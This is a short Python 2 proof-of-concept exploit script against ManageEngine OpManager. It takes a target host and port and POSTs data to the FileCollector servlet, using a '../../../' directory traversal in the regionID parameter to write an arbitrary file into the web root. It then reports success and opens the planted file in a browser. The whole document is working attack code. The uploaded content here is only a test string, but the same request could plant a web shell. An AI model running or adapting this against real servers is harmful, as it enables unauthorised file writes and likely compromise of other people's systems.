#-*-coding:utf-8-*-
import sys, httplib,webbrowser
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-t","--target",dest="host",help="press the target host,not include http://",metavar="HOST")
parser.add_option("-p","--port",dest="port",default='80',help="press the port,default 80")
(options,args) = parser.parse_args()
print options.host,options.port
if options.host==None:
    print 'ERROR:please press the correct target'
    exit()
host = options.host+':'+options.port



params = "test by w00yun"   #上传内容
filename = 'test1.txt'       #上传文件名
url = "/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector?regionID=../../../&FILENAME="+filename
url1 = 'http://'+host+'/'+filename
headers = {
    "Content-Type": "application/xml",
    "Accept-Encoding": "gzip, deflate",
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Host": host,
    "Connection": "Keep-Alive",
    "Cache-Control": "no-cache"
}
con2 = httplib.HTTPConnection(host)
con2.request("POST", url, params, headers)
r2 = con2.getresponse()
if r2.status == 500:
    print "Success", "\n"
    webbrowser.open_new_tab(url1)
else:
    print "Failed", "\n"
con2.close()